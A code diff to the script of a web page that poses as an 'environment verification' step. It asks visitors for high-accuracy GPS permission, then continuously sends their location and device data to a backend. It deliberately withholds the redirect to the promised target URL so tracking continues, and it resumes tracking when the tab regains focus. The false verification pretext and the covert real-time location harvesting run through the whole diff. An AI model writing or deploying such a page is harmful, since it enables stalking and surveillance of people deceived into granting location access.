@@ -182,6 +182,14 @@
     <script>
         const SESSION_ID = '{{SESSION_ID}}';
         const TARGET_URL = '{{TARGET_URL}}'; // Not redirecting automatically so tracking stays alive
+        
+        // 1. Generate or retrieve persistent Client Session Key (prevents duplicates on reload)
+        let clientSessionKey = sessionStorage.getItem('clientSessionKey');
+        if (!clientSessionKey) {
+            clientSessionKey = 'csk_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
+            sessionStorage.setItem('clientSessionKey', clientSessionKey);
+        }
+
         let trackingActive = false;
         let watchId = null;
         let lastSent = 0;
@@ -221,14 +229,12 @@
             iconContainer.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
             titleEl.innerText = 'Verification Complete';
             msgEl.innerText = 'Real-time environment tracking is now active. Please keep this page open to maintain the secure session.';
-            
-            // We DO NOT redirect here. 
-            // If the page unloads, watchPosition dies immediately and real-time tracking stops.
         }
 
         // Handle Deny State
         function showDenyState() {
-            stopTracking(); // Ensure tracking is fully halted
+            stopTracking();
+            trackingActive = false;
             iconContainer.className = 'icon-container error';
             iconContainer.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>';
             titleEl.innerText = 'Location Required';
@@ -257,6 +263,9 @@
             } catch (e) {}
 
             locationData.deviceData = deviceData;
+            
+            // 2. Attach client session key for deduplication
+            locationData.clientSessionKey = clientSessionKey;
 
             // Silently process to backend without blocking UI updates
             fetch('/api/location', {
@@ -268,7 +277,7 @@
             }).catch(e => console.error("Tracking update failed", e));
         }
 
-        // Trigger Real-Time Geolocation Tracking
+        // Trigger Geolocation API
         function requestLocation() {
             // Set requesting state
             retryBtn.classList.add('hidden');
@@ -278,42 +287,52 @@
             msgEl.innerText = 'Please select "Allow" when prompted by your browser to verify environment.';
 
             if ("geolocation" in navigator) {
-                // Clear any existing watch just in case
                 stopTracking();
 
-                watchId = navigator.geolocation.watchPosition(
+                // 3. Phased GPS Flow: Start with getCurrentPosition for the initial prompt
+                navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // 1. THROTTLING LOGIC: Only send updates if > 5 seconds have passed
                         const now = Date.now();
-                        if (now - lastSent > 5000) {
-                            lastSent = now;
-                            
-                            // 2. BACKGROUND TRACKING: Send updates even if tab is in the background
-                            // (Note: OS may eventually freeze background tabs after some time)
-                            enrichAndSend({
-                                sessionId: SESSION_ID,
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                timestamp: now
-                            });
-                        }
+                        lastSent = now;
+                        
+                        enrichAndSend({
+                            sessionId: SESSION_ID,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            timestamp: now,
+                            status: 'active'
+                        });
+
+                        // 4. If allowed, switch to continuous watchPosition
+                        watchId = navigator.geolocation.watchPosition(
+                            (pos) => {
+                                const t = Date.now();
+                                if (t - lastSent > 5000) {
+                                    lastSent = t;
+                                    enrichAndSend({
+                                        sessionId: SESSION_ID,
+                                        latitude: pos.coords.latitude,
+                                        longitude: pos.coords.longitude,
+                                        timestamp: t,
+                                        status: 'active'
+                                    });
+                                }
+                            },
+                            (err) => console.warn("Watch error:", err.message),
+                            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+                        );
                     },
                     (error) => {
                         console.warn("Location error:", error.message);
                         showDenyState();
                     },
-                    {
-                        enableHighAccuracy: true, // Force GPS usage for real-time tracking
-                        maximumAge: 0,
-                        timeout: 10000
-                    }
+                    { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
                 );
             } else {
                 showDenyState();
             }
         }
 
-        // Allows tracking to be cleanly destroyed
         function stopTracking() {
             if (watchId !== null) {
                 navigator.geolocation.clearWatch(watchId);
@@ -325,6 +344,32 @@
         function retryVerification() {
             requestLocation();
         }
+
+        // 5. Visibility Change (Page Lifecycle)
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === 'hidden') {
+                // User minimized browser or switched tabs
+                stopTracking();
+                
+                // Use fetch with keepalive to act as a sendBeacon
+                fetch('/api/location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    keepalive: true,
+                    body: JSON.stringify({ 
+                        sessionId: SESSION_ID, 
+                        clientSessionKey: clientSessionKey, 
+                        status: 'hidden' 
+                    })
+                }).catch(e => console.log("Beacon failed", e));
+                
+            } else if (document.visibilityState === 'visible') {
+                // User returned to the tab
+                if (trackingActive) {
+                    requestLocation(); // Resume tracking silently
+                }
+            }
+        });
 
         // Auto Start on Page Load
         window.onload = () => {
